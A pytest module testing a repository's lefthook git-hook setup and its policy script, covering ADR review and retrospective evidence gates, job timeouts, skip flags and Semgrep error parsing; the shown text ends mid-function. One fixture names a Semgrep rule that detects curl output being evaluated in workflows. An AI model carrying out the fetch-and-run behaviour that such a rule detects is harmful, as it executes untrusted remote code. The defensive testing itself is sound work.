from __future__ import annotations

import ast
import io
import json
import os
import re
import runpy
import shutil
import subprocess
import sys
import time
from collections.abc import Iterator, Mapping, Sequence
from datetime import UTC, datetime, tzinfo
from pathlib import Path
from typing import Any, NoReturn, Self, cast
from unittest import mock

import pytest
import yaml

from scripts.validation import git_hook_policy as policy

PROJECT_ROOT = Path(__file__).resolve().parents[1]
LEFTHOOK = shutil.which("lefthook")
SEMGREP = shutil.which("semgrep")
# The Semgrep carve-out proves a `run:` body parses by shelling out to `bash -n`,
# and fails closed when the host has no Bash. Windows runners put Git's `cmd`
# directory on PATH but not its `bin` directory, so `bash.exe` is often absent
# and every carve-out assertion below would fail for an environmental reason
# rather than a behavioral one. Skip those and keep the fail-closed tests, which
# are the ones that matter on a Bash-less host (Refs #3663).
BASH_AVAILABLE = policy._resolve_bash() is not None
requires_bash = pytest.mark.skipif(
    not BASH_AVAILABLE,
    reason="requires a Bash interpreter for `bash -n` syntax checking",
)
# lefthook executes `run:` strings through sh, even on Windows. A native
# sys.executable path there (D:\...\python.exe) has its backslashes eaten by sh,
# so embed a POSIX-style path (D:/.../python.exe) that sh accepts on both
# platforms. as_posix() is a no-op on already-POSIX paths. Every lefthook
# `run:` string that invokes the interpreter must use this, not raw
# sys.executable (Refs #3289, #3196).
PYTHON_POSIX = Path(sys.executable).as_posix()
HOOK_PAYLOADS = (
    PROJECT_ROOT / "scripts/hooks/pre-commit",
    PROJECT_ROOT / "scripts/hooks/pre-push",
    PROJECT_ROOT / "scripts/hooks/commit-msg",
)
POLICY_SUPPORT_FILES = (
    "scripts/maintenance/repair_packed_refs.py",
    "scripts/validation/git_hook_policy.py",
    "scripts/validation/sha_pinning.py",
    "scripts/validation/__init__.py",
    "scripts/validation/check_pr_bypass_label.py",
    "scripts/validation/validate_review_marker.py",
    "build/scripts/validate_plugin_version_bump.py",
)


@pytest.fixture(autouse=True)
def _isolate_git_config(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", os.devnull)
    monkeypatch.setenv("GIT_CONFIG_SYSTEM", os.devnull)
    monkeypatch.delenv("GIT_CONFIG_PARAMETERS", raising=False)
    for name in tuple(os.environ):
        if name.startswith("GIT_CONFIG_") and name not in {
            "GIT_CONFIG_GLOBAL",
            "GIT_CONFIG_SYSTEM",
        }:
            monkeypatch.delenv(name, raising=False)


def _write_lf(path: Path, content: str) -> str:
    """Write ``content`` to ``path`` with LF endings, whatever the platform.

    ``Path.write_text`` opens in text mode, so it translates ``\\n`` to the
    platform separator and a fixture authored as LF lands as CRLF on Windows.
    Every fixture in this module stands in for a file in this repo, and
    ``.gitattributes`` normalises the whole repo to LF, so a CRLF fixture is
    not a faithful stand-in. Three concrete failures on the Windows job traced
    back to it: byte offsets computed against a re-read LF string pointed past
    the YAML node they were meant to sit inside, and a diff between an LF base
    commit and a CRLF working copy reported every line as changed.

    Use this instead of ``path.write_text`` for any fixture. Pass
    ``newline=`` to ``write_text`` directly only when a test needs a specific
    non-LF separator on purpose.
    """
    path.write_text(content, encoding="utf-8", newline="\n")
    return content


def _git(
    repo: Path,
    *args: str,
    check: bool = True,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args],
        cwd=repo,
        text=True,
        encoding="utf-8",
        errors="replace",
        capture_output=True,
        check=check,
    )


def _init_repo(repo: Path, branch: str = "feature/test") -> None:
    repo.mkdir(parents=True, exist_ok=True)
    _git(repo, "init", "-q", "-b", branch)
    _git(repo, "config", "user.name", "Test User")
    _git(repo, "config", "user.email", "user@example.com")


def _commit_file(repo: Path, relative_path: str, content: str) -> str:
    path = repo / relative_path
    path.parent.mkdir(parents=True, exist_ok=True)
    _write_lf(path, content)
    path.write_bytes(content.encode("utf-8"))
    _git(repo, "add", "--", relative_path)
    _git(repo, "commit", "-qm", f"test: add {Path(relative_path).name}")
    return _git(repo, "rev-parse", "HEAD").stdout.strip()


def _write_file(repo: Path, relative_path: str, content: str) -> None:
    """Write a worktree file as the bytes it was handed.

    `Path.write_text` translates `\n` to `os.linesep`, so a caller asking for
    `a\nb` puts `a\r\nb` on disk under Windows. `_commit_file` writes bytes, so
    a test that seeded a path one way and revised it the other produced two
    revisions differing on every line, and any diff taken across them was of
    the line endings rather than the edit. This is the same primitive, so the
    two agree on every platform.
    """
    path = repo / relative_path
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(content.encode("utf-8"))


def _copy_runtime_config(repo: Path) -> None:
    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))
    for hook_name in ("commit-msg", "pre-commit", "pre-push"):
        jobs = config[hook_name]["jobs"]
        for job in _flatten_jobs(jobs):
            run = job.get("run")
            if isinstance(run, str):
                job["run"] = run.replace(
                    "uv run --frozen --extra dev python",
                    f'"{PYTHON_POSIX}"',
                ).replace(
                    "uv run --frozen python",
                    f'"{PYTHON_POSIX}"',
                )
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config, sort_keys=False))
    for relative_path in POLICY_SUPPORT_FILES:
        source = PROJECT_ROOT / relative_path
        destination = repo / relative_path
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, destination)


def _run_lefthook(
    repo: Path,
    *args: str,
    stdin: str | None = None,
    check: bool = True,
    env: Mapping[str, str] | None = None,
) -> subprocess.CompletedProcess[str]:
    assert LEFTHOOK is not None
    process_env = os.environ.copy()
    if env is not None:
        process_env.update(env)
    result = subprocess.run(
        [LEFTHOOK, *args],
        cwd=repo,
        env=process_env,
        input=stdin,
        text=True,
        encoding="utf-8",
        errors="replace",
        capture_output=True,
        check=False,
    )
    if check and result.returncode != 0:
        pytest.fail(f"lefthook failed:\n{result.stdout}\n{result.stderr}")
    return result


def _flatten_jobs(items: Sequence[dict[str, object]]) -> Iterator[dict[str, object]]:
    for item in items:
        group = item.get("group")
        if isinstance(group, dict):
            jobs = group.get("jobs")
            assert isinstance(jobs, list)
            yield from _flatten_jobs(jobs)
            continue
        yield item


def _job_map(config: dict[str, object], hook: str) -> dict[str, dict[str, object]]:
    hook_config = config[hook]
    assert isinstance(hook_config, dict)
    jobs = hook_config["jobs"]
    assert isinstance(jobs, list)
    return {str(job["name"]): job for job in _flatten_jobs(jobs)}


def _completed(
    returncode: int,
    stdout: str = "",
    stderr: str = "",
) -> subprocess.CompletedProcess[str]:
    return subprocess.CompletedProcess([], returncode, stdout, stderr)


def _semgrep_completed(
    returncode: int,
    scanned: Sequence[Path | str],
) -> subprocess.CompletedProcess[str]:
    return _completed(
        returncode,
        json.dumps(
            {
                "errors": [],
                "paths": {"scanned": [str(path) for path in scanned]},
            },
        ),
    )


def _powershell_semgrep_error(
    path: Path,
    rule_id: str,
    script: str = 'Write-Host "safe"',
) -> dict[str, object]:
    return {
        "code": 2,
        "level": "warn",
        "message": f"Internal matching error: {policy.SEMGREP_POWERSHELL_ERROR_MARKER} {script}",
        "path": str(path),
        "rule_id": rule_id,
        "type": "Internal matching error",
    }


def _powershell_partial_parsing_error(
    path: Path,
    *,
    line: int,
    rule_id: str = "yaml.github-actions.security.curl-eval.curl-eval",
) -> dict[str, object]:
    content = path.read_bytes().decode("utf-8")
    source_lines = content.splitlines(keepends=True)
    start_offset = 0
    start_col = 1
    if 1 <= line <= len(source_lines):
        source_line = source_lines[line - 1]
        line_offset = sum(len(value) for value in source_lines[: line - 1])
        run_marker = source_line.find("run:")
        if run_marker >= 0:
            value_offset = run_marker + len("run:")
            while value_offset < len(source_line) and source_line[value_offset].isspace():
                value_offset += 1
            start_offset = line_offset + value_offset
            start_col = value_offset + 1
    return {
        "code": 3,
        "level": "warn",
        "message": (f"When parsing a snippet as Bash for metavariable-pattern in rule '{rule_id}'"),
        "path": str(path),
        "rule_id": None,
        "type": [
            "PartialParsing",
            [
                {
                    "path": str(path),
                    "start": {
                        "line": line,
                        "col": start_col,
                        "offset": start_offset,
                    },
                    "end": {
                        "line": line,
                        "col": start_col + 1,
                        "offset": start_offset + 1,
                    },
                }
            ],
        ],
    }


def _push_update(
    destination_branch: str | None = "a",
    *,
    head: str = "head",
    range_spec: str = "base..head",
) -> policy.PushUpdate:
    source = policy.PushRef("refs/heads/a", "1" * 40, "refs/heads/a", "2" * 40)
    return policy.PushUpdate(source, "base", head, range_spec, destination_branch)


def _write_today_session(repo: Path, content: str) -> Path:
    today = datetime.now(tz=UTC).strftime("%Y-%m-%d")
    session = repo / ".agents" / "sessions" / f"{today}-session-1.json"
    session.parent.mkdir(parents=True, exist_ok=True)
    _write_lf(session, content)
    return session


def test_adr_review_policy_blocks_stale_debate_reference(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
    analysis = tmp_path / ".agents" / "analysis"
    analysis.mkdir(parents=True)
    _write_lf(analysis / "old-debate.md", "ADR-042 review")

    result = policy.check_adr_review_policy(
        [".agents/architecture/ADR-062-navigation.md"],
        tmp_path,
    )

    assert result == 1
    assert "ADR-062" in capsys.readouterr().err


def test_adr_review_policy_allows_fresh_evidence_and_no_adr_change(tmp_path: Path) -> None:
    _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
    analysis = tmp_path / ".agents" / "analysis"
    analysis.mkdir(parents=True)
    _write_lf(analysis / "adr-062-debate.md", "ADR-062 review")

    assert (
        policy.check_adr_review_policy(
            [".agents/architecture/ADR-062-navigation.md"],
            tmp_path,
        )
        == 0
    )
    assert policy.check_adr_review_policy(["README.md"], tmp_path) == 0


def test_adr_review_policy_matches_complete_adr_ids(tmp_path: Path) -> None:
    _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
    analysis = tmp_path / ".agents" / "analysis"
    analysis.mkdir(parents=True)
    _write_lf(analysis / "adr-0620-debate.md", "ADR-0620 review")

    assert (
        policy.check_adr_review_policy(
            [".agents/architecture/ADR-062-navigation.md"],
            tmp_path,
        )
        == 1
    )


def test_adr_review_policy_rejects_symlinked_debate_evidence(tmp_path: Path) -> None:
    if os.name == "nt":
        pytest.skip("Symlink creation requires elevated Windows privileges")
    _write_today_session(tmp_path, '{"notes": "/adr-review was run"}')
    analysis = tmp_path / ".agents" / "analysis"
    analysis.mkdir(parents=True)
    evidence = tmp_path / "evidence.md"
    _write_lf(evidence, "ADR-062 review")
    (analysis / "adr-062-debate.md").symlink_to(evidence)

    assert (
        policy.check_adr_review_policy(
            [".agents/architecture/ADR-062-navigation.md"],
            tmp_path,
        )
        == 1
    )


def test_retrospective_policy_blocks_missing_evidence(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
) -> None:
    _write_today_session(tmp_path, '{"notes": "implementation complete"}')

    result = policy.check_retrospective_evidence(
        ["scripts/one.py", "tests/test_one.py"],
        tmp_path,
    )

    assert result == 1
    assert "retrospective evidence" in capsys.readouterr().err
    # Empty paths should still check for retrospective evidence (not bypass)
    assert policy.check_retrospective_evidence([], tmp_path) == 1
    captured = capsys.readouterr()
    assert "{push_files} empty" in captured.err


def test_retrospective_policy_allows_session_evidence_and_documentation(
    tmp_path: Path,
) -> None:
    _write_today_session(tmp_path, '{"notes": "Learnings captured"}')

    assert (
        policy.check_retrospective_evidence(
            ["scripts/one.py", "tests/test_one.py"],
            tmp_path,
        )
        == 0
    )
    assert policy.check_retrospective_evidence(["README.md"], tmp_path) == 0


def test_retrospective_trivial_session_includes_ten_minute_boundary(
    tmp_path: Path,
) -> None:
    session = _write_today_session(tmp_path, '{"notes": "no retrospective"}')
    boundary = session.stat().st_ctime + 600

    assert policy._is_trivial_retrospective_session(
        session,
        ["scripts/one.py"],
        now_epoch=boundary,
    )
    assert not policy._is_trivial_retrospective_session(
        session,
        ["scripts/one.py"],
        now_epoch=boundary + 0.001,
    )
    assert not policy._is_trivial_retrospective_session(
        session,
        [],
        now_epoch=boundary,
    )


def _freeze_policy_clock(monkeypatch: pytest.MonkeyPatch, instant: datetime) -> None:
    """Freeze git_hook_policy's UTC clock to a fixed instant for date-window tests.

    The retrospective and session-log helpers derive today/yesterday from
    ``datetime.now(tz=UTC)``. Pinning it removes the once-per-day midnight-tick
    race that would otherwise make the cross-midnight assertions flaky.
    """

    class _FrozenDateTime(datetime):
        @classmethod
        def now(cls, tz: tzinfo | None = None) -> Self:
            return cls.fromtimestamp(instant.timestamp(), tz)

    monkeypatch.setattr(policy, "datetime", _FrozenDateTime)


def test_retrospective_policy_accepts_yesterday_retro_across_midnight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A retro dated yesterday UTC satisfies the gate today (cross-midnight grace).

    Regression guard for #3305: a session that does real work on day N and
    pushes just after 00:00 UTC on day N+1 must not be blocked when the day-N
    retrospective exists. ``_today_retrospective_exists`` globs today AND
    yesterday, so the yesterday-dated retro is honored.
    """
    _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
    retro = tmp_path / ".agents" / "retrospective" / "2026-03-14-session-finish.md"
    retro.parent.mkdir(parents=True, exist_ok=True)
    _write_lf(retro, "# Retrospective\nreal work\n")

    # Two paths avoid the trivial-session bypass, isolating the yesterday grace.
    assert (
        policy.check_retrospective_evidence(
            ["scripts/one.py", "tests/test_one.py"],
            tmp_path,
        )
        == 0
    )


def test_retrospective_policy_accepts_yesterday_session_evidence_across_midnight(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Evidence in a yesterday-dated session log satisfies the gate today.

    Regression guard for #3305: ``_today_session_log`` globs today AND
    yesterday, so evidence committed in the day-N session log is consulted on
    day N+1 even with no retrospective file present.
    """
    _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
    sessions = tmp_path / ".agents" / "sessions"
    sessions.mkdir(parents=True, exist_ok=True)
    _write_lf(sessions / "2026-03-14-session-1.json", '{"notes": "Learnings captured"}')

    # No retrospective file: the only passing path is the yesterday session log.
    assert (
        policy.check_retrospective_evidence(
            ["scripts/one.py", "tests/test_one.py"],
            tmp_path,
        )
        == 0
    )


def test_retrospective_policy_blocks_evidence_older_than_grace_window(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A retro/session two days old is outside the 24h grace and still blocks.

    Negative control for #3305: the cross-midnight tolerance is exactly one day
    (today + yesterday). Evidence from two days ago must not satisfy the gate,
    so the widened window cannot silently accept arbitrarily stale sessions.
    """
    _freeze_policy_clock(monkeypatch, datetime(2026, 3, 15, 0, 30, tzinfo=UTC))
    retro = tmp_path / ".agents" / "retrospective" / "2026-03-13-x.md"
    retro.parent.mkdir(parents=True, exist_ok=True)
    _write_lf(retro, "# Retrospective\nstale\n")
    sessions = tmp_path / ".agents" / "sessions"
    sessions.mkdir(parents=True, exist_ok=True)
    _write_lf(sessions / "2026-03-13-session-1.json", '{"notes": "Learnings captured"}')

    # Two paths avoid the trivial-session bypass; two-days-old evidence is stale.
    assert (
        policy.check_retrospective_evidence(
            ["scripts/one.py", "tests/test_one.py"],
            tmp_path,
        )
        == 1
    )


def test_configuration_uses_named_native_jobs() -> None:
    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))

    assert config["min_version"] == "2.1.10"
    assert config["glob_matcher"] == "doublestar"
    assert "commands" not in config["commit-msg"]
    assert "commands" not in config["pre-commit"]
    assert "commands" not in config["pre-push"]
    assert set(_job_map(config, "commit-msg")) == {"commit-message-policy"}
    expected_pre_commit = {
        "repair-packed-refs",
        "branch-policy",
        "handoff-protection",
        "session-policy",
        "staged-dash-policy",
        "action-pin-policy",
        "markdown-autofix",
        "markdown-check",
        "python-autofix",
        "python-check",
        "workflow-validation",
        "actionlint",
        "yaml-advisory",
        "skillforge",
        "skill-size",
        "planning-advisory",
        "infrastructure-advisory",
        "memory-index",
        "memory-size",
        "memory-tier",
        "memory-skill-format",
        "adr-review-policy",
        "taste-advisory",
        "scope-policy",
        "generate-mcp-config",
        "stage-mcp-config",
        "generate-agents",
        "generate-agent-catalog",
        "stage-generated-agents",
        "memory-token-update",
        "stage-memory-index",
        "memory-cross-reference",
        "stage-memory-cross-references",
        "memory-sync-advisory",
        "extract-session-episodes",
    }
    expected_pre_push = {
        "repair-packed-refs",
        "push-ref-policy",
        "retrospective-policy",
        "pre-pr-validation",
        "python-tests",
        "python-lint-advisory",
        "python-type-check",
        "security-scan",
        "security-suppression-policy",
        "infrastructure-advisory",
        "workflow-local-run",
        "path-normalization",
        "planning-artifacts",
        "build-all-check",
        "placeholder-identity",
        "branch-scope",
        "additions-advisory",
        "hook-anchoring-e2e",
        "plugin-load-e2e",
        "review-axis-drift",
        "session-json-validation",
        "observation-sync-advisory",
        "bot-cascade-advisory",
    }
    assert expected_pre_commit <= set(_job_map(config, "pre-commit"))
    assert expected_pre_push <= set(_job_map(config, "pre-push"))
    pre_commit = _job_map(config, "pre-commit")
    pre_push = _job_map(config, "pre-push")
    assert str(pre_commit["adr-review-policy"]["run"]).endswith(
        "git_hook_policy.py adr-review {staged_files}"
    )
    assert str(pre_push["retrospective-policy"]["run"]).endswith(
        "git_hook_policy.py retrospective {push_files}"
    )
    pre_commit_names = [str(job["name"]) for job in _flatten_jobs(config["pre-commit"]["jobs"])]
    assert pre_commit_names.index("memory-token-update") < pre_commit_names.index("memory-size")
    assert pre_commit_names.index("memory-size") < pre_commit_names.index("memory-cross-reference")
    assert pre_commit_names.index("memory-cross-reference") < pre_commit_names.index(
        "memory-skill-format"
    )
    assert pre_commit_names.index("memory-skill-format") < pre_commit_names.index(
        "memory-sync-advisory"
    )


def test_configuration_bounds_every_job() -> None:
    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))

    for hook_name in ("commit-msg", "pre-commit", "pre-push"):
        jobs = list(_flatten_jobs(config[hook_name]["jobs"]))
        assert jobs
        assert all(isinstance(job.get("timeout"), str) for job in jobs)

    pre_push = _job_map(config, "pre-push")
    assert pre_push["python-tests"]["timeout"] == "30m"
    assert pre_push["workflow-local-run"]["timeout"] == "30m"
    assert pre_push["security-scan"]["timeout"] == "15m"
    assert pre_push["hook-anchoring-e2e"]["timeout"] == "20m"
    assert pre_push["plugin-load-e2e"]["timeout"] == "20m"


def _parse_lefthook_duration(value: str) -> int:
    """Parse a Lefthook duration string (e.g. '30s', '2m', '1h') to seconds."""
    units = {"s": 1, "m": 60, "h": 3600}
    suffix = value[-1]
    if suffix not in units:
        raise ValueError(f"Unknown duration suffix in {value!r}")
    return int(value[:-1]) * units[suffix]


_POLICY_SUBCOMMAND_TIMEOUT: dict[str, int] = {
    "semgrep-push": policy.SEMGREP_TIMEOUT_SECONDS,
    "mypy": policy.MYPY_TIMEOUT_SECONDS,
    "pytest": policy.TEST_SUITE_TIMEOUT_SECONDS,
    "workflow-local": policy.WORKFLOW_LOCAL_TIMEOUT_SECONDS,
    "cli-hook-e2e": policy.CLI_E2E_TIMEOUT_SECONDS,
    "cli-plugin-e2e": policy.CLI_E2E_TIMEOUT_SECONDS,
}

_MINIMUM_MARGIN_SECONDS = 30


def test_each_python_subprocess_budget_has_lefthook_headroom() -> None:
    """Verify per-child configured budget headroom, not whole-command completion."""
    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))
    policy_script = "scripts/validation/git_hook_policy.py "

    for hook_name in ("pre-commit", "pre-push"):
        jobs = list(_flatten_jobs(config[hook_name]["jobs"]))
        for job in jobs:
            run_str = job.get("run", "")
            if not isinstance(run_str, str) or policy_script not in run_str:
                continue

            job_name = job["name"]
            job_timeout = job["timeout"]
            assert isinstance(job_timeout, str)
            outer_seconds = _parse_lefthook_duration(job_timeout)

            # Extract the subcommand token immediately after the script path.
            after_script = run_str.split(policy_script, 1)[1]
            subcommand = after_script.split()[0]

            inner_seconds = _POLICY_SUBCOMMAND_TIMEOUT.get(
                subcommand, policy.DEFAULT_SUBPROCESS_TIMEOUT_SECONDS
            )

            margin = outer_seconds - inner_seconds
            assert margin >= _MINIMUM_MARGIN_SECONDS, (
                f"{job_name!r} ({hook_name}): outer={outer_seconds}s, "
                f"inner={inner_seconds}s, margin={margin}s < {_MINIMUM_MARGIN_SECONDS}s"
            )


def test_configuration_uses_native_filters_scheduling_and_staging() -> None:
    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))
    pre_commit = config["pre-commit"]
    pre_push = config["pre-push"]
    pre_commit_jobs = _job_map(config, "pre-commit")
    pre_push_jobs = _job_map(config, "pre-push")

    assert pre_commit["piped"] is True
    assert pre_push["piped"] is True
    assert "files" not in pre_push
    assert pre_commit["jobs"][0]["name"] == "repair-packed-refs"
    assert pre_push["jobs"][0]["name"] == "repair-packed-refs"
    assert pre_commit_jobs["markdown-autofix"]["stage_fixed"] is True
    markdown_autofix_run = pre_commit_jobs["markdown-autofix"]["run"]
    markdown_check_run = pre_commit_jobs["markdown-check"]["run"]
    assert isinstance(markdown_autofix_run, str)
    assert isinstance(markdown_check_run, str)
    assert "scripts/validation/pre_pr.py --markdown-lint-only" in markdown_autofix_run
    assert "scripts/validation/pre_pr.py --markdown-lint-only" in markdown_check_run
    assert pre_commit_jobs["markdown-check"]["env"] == {"SKIP_AUTOFIX": "1"}
    assert pre_commit_jobs["python-autofix"]["stage_fixed"] is True
    merge_exempt_jobs = {
        "session-policy",
        "staged-dash-policy",
        "markdown-autofix",
        "markdown-check",
        "python-autofix",
        "generate-mcp-config",
        "stage-mcp-config",
        "generate-agents",
        "generate-agent-catalog",
        "stage-generated-agents",
        "memory-token-update",
        "stage-memory-index",
        "memory-cross-reference",
        "stage-memory-cross-references",
        "memory-sync-advisory",
        "extract-session-episodes",
        "memory-size",
    }
    pure_jobs = {
        "action-pin-policy",
        "python-check",
        "workflow-validation",
        "actionlint",
        "yaml-advisory",
        "skillforge",
        "skill-size",
        "planning-advisory",
        "infrastructure-advisory",
        "memory-index",
        "memory-tier",
        "memory-skill-format",
        "adr-review-policy",
        "taste-advisory",
    }
    for name in merge_exempt_jobs:
        skip = pre_commit_jobs[name].get("skip", [])
        assert isinstance(skip, list)
        assert "merge" in skip
    for name in pure_jobs:
        skip = pre_commit_jobs[name].get("skip", [])
        assert isinstance(skip, list)
        assert "merge" not in skip
    assert "glob" not in pre_push_jobs["pre-pr-validation"]
    assert "glob" not in pre_push_jobs["python-tests"]
    assert pre_push_jobs["pre-pr-validation"]["env"] == {"SKIP_AUTOFIX": "1"}
    assert pre_push_jobs["push-ref-policy"]["use_stdin"] is True
    assert pre_push_jobs["security-scan"]["use_stdin"] is True
    assert pre_push_jobs["security-suppression-policy"]["use_stdin"] is True
    stdin_groups = [
        item["group"]
        for item in pre_push["jobs"]
        if isinstance(item.get("group"), dict)
        and any(bool(job.get("use_stdin")) for job in item["group"].get("jobs", []))
    ]
    assert len(stdin_groups) == 1
    assert stdin_groups[0].get("piped") is True
    assert stdin_groups[0].get("parallel") is not True
    assert [job["name"] for job in stdin_groups[0]["jobs"]] == [
        "push-ref-policy",
        "security-scan",
        "security-suppression-policy",
        "placeholder-identity",
    ]
    markdown_groups = [
        item["group"]
        for item in pre_commit["jobs"]
        if isinstance(item.get("group"), dict)
        and {str(job.get("name")) for job in item["group"].get("jobs", [])}
        == {"markdown-autofix", "markdown-check"}
    ]
    assert len(markdown_groups) == 1
    assert markdown_groups[0].get("piped") is True
    infrastructure_run = pre_push_jobs["infrastructure-advisory"]["run"]
    assert isinstance(infrastructure_run, str)
    assert "--files {push_files}" in infrastructure_run
    for name in (
        "python-lint-advisory",
        "python-type-check",
        "infrastructure-advisory",
        "workflow-local-run",
        "session-json-validation",
        "observation-sync-advisory",
    ):
        run = pre_push_jobs[name]["run"]
        assert isinstance(run, str)
        assert "{push_files}" in run
    workflow_run = pre_push_jobs["workflow-local-run"]["run"]
    build_run = pre_push_jobs["build-all-check"]["run"]
    branch_scope_run = pre_push_jobs["branch-scope"]["run"]
    assert isinstance(workflow_run, str)
    assert isinstance(build_run, str)
    assert isinstance(branch_scope_run, str)
    assert "--no-full" not in workflow_run
    assert build_run.endswith("build_all.py --check")
    assert "origin/main" in branch_scope_run
    pre_commit_parallel = False
    for item in pre_commit["jobs"]:
        group = item.get("group")
        if isinstance(group, dict) and group.get("parallel"):
            pre_commit_parallel = True
            break
    pre_push_parallel = False
    for item in pre_push["jobs"]:
        group = item.get("group")
        if isinstance(group, dict) and group.get("parallel"):
            pre_push_parallel = True
            break
    assert pre_commit_parallel
    assert pre_push_parallel


def test_actionlint_and_cli_trigger_scopes_are_native_globs() -> None:
    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))
    pre_commit = _job_map(config, "pre-commit")
    pre_push = _job_map(config, "pre-push")

    assert pre_commit["actionlint"]["glob"] == ".github/workflows/**/*.{yml,yaml}"
    assert ".github/actions/**" not in str(pre_commit["actionlint"]["glob"])
    hook_globs = pre_push["hook-anchoring-e2e"]["glob"]
    plugin_globs = pre_push["plugin-load-e2e"]["glob"]
    assert isinstance(hook_globs, list)
    assert isinstance(plugin_globs, list)
    assert "tests/e2e/copilot_hook_probe.py" in hook_globs
    assert "tests/e2e/copilot_hook_probe.py" in plugin_globs
    assert "src/copilot-cli/hooks/**" in hook_globs
    assert "src/copilot-cli/skills/**" in plugin_globs


def test_autofix_and_tool_skip_conditions_are_explicit() -> None:
    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))
    jobs = _job_map(config, "pre-commit")

    for name in (
        "markdown-autofix",
        "python-autofix",
        "generate-mcp-config",
        "stage-mcp-config",
        "generate-agents",
        "generate-agent-catalog",
        "stage-generated-agents",
        "memory-token-update",
        "stage-memory-index",
        "memory-cross-reference",
        "stage-memory-cross-references",
        "extract-session-episodes",
    ):
        skip = jobs[name]["skip"]
        assert isinstance(skip, list)
        assert {"run": 'test "$SKIP_AUTOFIX" = "1"'} in skip
    actionlint_skip = jobs["actionlint"]["skip"]
    assert isinstance(actionlint_skip, list)
    assert {
        "run": ('test "$SKIP_ACTIONLINT" = "1" || ! command -v actionlint >/dev/null 2>&1')
    } in actionlint_skip


def test_lefthook_skip_envs_preserve_check_only_execution(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    marker = repo / "marker.py"
    _write_lf(
        marker,
        "from pathlib import Path\nimport sys\n"
        "p=Path('jobs.log'); old=p.read_text() if p.exists() else ''\n"
        "p.write_text(old + sys.argv[1] + '\\n')\n",
    )
    jobs = [
        {
            "name": "autofix",
            "run": f'"{PYTHON_POSIX}" marker.py autofix',
            "skip": [{"run": 'test "$SKIP_AUTOFIX" = "1"'}],
        },
        {"name": "check", "run": f'"{PYTHON_POSIX}" marker.py check'},
        {
            "name": "actionlint",
            "run": f'"{PYTHON_POSIX}" marker.py actionlint',
            "skip": [{"run": 'test "$SKIP_ACTIONLINT" = "1"'}],
        },
    ]
    config = {"pre-commit": {"jobs": jobs}}
    _write_lf(repo / "lefthook.yml", yaml.safe_dump(config))
    _commit_file(repo, "tracked", "content\n")

    skipped_fix = _run_lefthook(
        repo,
        "run",
        "pre-commit",
        "--job",
        "autofix",
        "--force",
        env={"SKIP_AUTOFIX": "1"},
    )
    _run_lefthook(repo, "run", "pre-commit", "--job", "check", "--force")
    skipped_actionlint = _run_lefthook(
        repo,
        "run",
        "pre-commit",
        "--job",
        "actionlint",
        "--force",
        env={"SKIP_ACTIONLINT": "1"},
    )

    assert (repo / "jobs.log").read_text(encoding="utf-8") == "check\n"
    assert "skip" in skipped_fix.stdout.lower()
    assert "skip" in skipped_actionlint.stdout.lower()


def test_configuration_and_tree_have_no_payload_scripts() -> None:
    config_text = (PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8")
    policy_text = (PROJECT_ROOT / "scripts/validation/git_hook_policy.py").read_text(
        encoding="utf-8"
    )
    assert "scripts/hooks/pre-commit" not in config_text
    assert "scripts/hooks/pre-push" not in config_text
    assert "scripts/hooks/commit-msg" not in config_text
    assert "auto-retro-suppress" not in config_text
    assert "auto-retrospective.suppress" not in policy_text
    # The hook that owned the sentinel is gone (#3349). Assert that file, not
    # the whole Stop directory: this test's subject is the auto-retro payload,
    # and a future Stop hook added for an unrelated reason should not fail a
    # test named "no payload scripts". The broader claim that no Stop hook is
    # registered on any surface has its own gate in
    # tests/build_scripts/test_hook_contract_knowledge.py.
    assert not (PROJECT_ROOT / ".claude/hooks/Stop/invoke_auto_retrospective.py").exists()
    assert all(not path.exists() for path in HOOK_PAYLOADS)


def test_runtime_configuration_validates_with_pinned_lefthook() -> None:
    assert LEFTHOOK is not None
    config = yaml.safe_load((PROJECT_ROOT / "lefthook.yml").read_text(encoding="utf-8"))

    version = subprocess.run(
        [LEFTHOOK, "version"],
        cwd=PROJECT_ROOT,
        text=True,
        encoding="utf-8",
        errors="replace",
        capture_output=True,
        check=True,
    )
    validated = subprocess.run(
        [LEFTHOOK, "validate"],
        cwd=PROJECT_ROOT,
        text=True,
        encoding="utf-8",
        errors="replace",
        capture_output=True,
        check=False,
    )

    assert config["lefthook"] == "uv run --frozen lefthook"
    assert version.stdout.splitlines()[0] == "2.1.10"
    assert validated.returncode == 0
    assert "All good" in validated.stdout


def test_lefthook_timeout_stops_hung_job(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    _init_repo(repo)
    # Express the hung job as a script file, not an inline `python -c "..."`.
    # On Windows lefthook runs `run:` strings through sh, and the nested double
    # quotes around a space-containing -c payload collide with sh's own quoting:
    # the payload word-splits, python receives a bare `import`, and the job errors
    # instantly instead of hanging, so the 1s timeout never fires. A script path
    # with no spaces and no nested quotes runs identically on both platforms (the
    # sibling stage_fixed test uses the same `"{PYTHON_POSIX}" name.py` shape).
